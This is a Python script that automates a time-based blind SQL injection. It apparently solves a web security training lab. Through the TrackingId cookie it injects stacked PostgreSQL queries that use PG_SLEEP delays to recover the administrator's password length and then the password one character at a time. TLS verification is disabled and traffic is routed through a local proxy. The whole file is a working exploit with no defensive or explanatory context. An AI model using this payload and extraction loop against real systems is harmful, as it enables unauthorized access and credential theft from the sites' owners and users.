import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Changeable Variables
session = ""  # Change this to your session cookie
TrackingId = ""  # Change this to your TrackingId cookie

url = ""  # Change this to the URL of the website
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}  # Change this to your proxy settings, if needed


def get_password_length():
    print("(+) Getting password length")
    password_length = 0
    for i in range(1, 100):
        payload = f"'; SELECT CASE WHEN ((SELECT LENGTH(PASSWORD) FROM users where username='administrator' limit 1)={i}) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END -- -"
        payload = urllib.parse.quote(payload)
        cookies = {"TrackingId": TrackingId + payload, "session": session}
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxy)
        if response.elapsed.total_seconds() >= 5:
            password_length = i
            break
    print(f"Password length : {password_length}")
    return password_length


# Characters to be used in the password, Alphanumeric Characters
characters = (
    [chr(i) for i in range(48, 58)]
    + [chr(i) for i in range(65, 91)]
    + [chr(i) for i in range(97, 123)]
)


def get_password(password_length):
    print("(+) Getting Password")
    password = ""
    for i in range(1, password_length + 1):
        for char in characters:
            payload = f"'; SELECT CASE WHEN ((SELECT SUBSTRING(PASSWORD, {i}, 1) FROM users where username='administrator' limit 1)='{char}') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END -- -"
            payload = urllib.parse.quote(payload)
            cookies = {"TrackingId": TrackingId + payload, "session": session}
            response = requests.get(url, cookies=cookies, verify=False, proxies=proxy)
            if response.elapsed.total_seconds() >= 5:
                password += char
                print(f"Password : {password}")
                break
    return password


if __name__ == "__main__":
    password_length = get_password_length()
    password = get_password(password_length)
    print(f"Administrator Password : '{password}'")
